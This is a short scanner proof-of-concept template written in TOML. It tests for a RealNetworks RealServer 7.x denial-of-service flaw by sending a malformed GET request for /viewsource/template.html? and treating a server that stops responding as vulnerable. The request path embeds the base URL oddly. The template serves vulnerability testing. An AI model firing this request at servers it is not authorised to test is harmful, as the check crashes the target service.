[info]
author = "AVE"
description = "检测 RealNetworks RealServer 7.x 是否存在 viewsource 目录畸形请求拒绝服务漏洞。向目标发送 GET /viewsource/template.html? 请求，若服务器崩溃或停止响应则存在漏洞。"
id = "POC-AVE-2000-0397"
name = "RealNetworks RealServer viewsource 拒绝服务 PoC"
severity = "high"
tags = [
    "cve-2000-0474",
    "denial-of-service",
    "realserver",
]
vuln_id = [
    "CVE-2000-0474",
    "AVE-2000-0397",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/viewsource/template.html?"
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = false
status = [
    200,
    302,
    500,
]
type = "status"
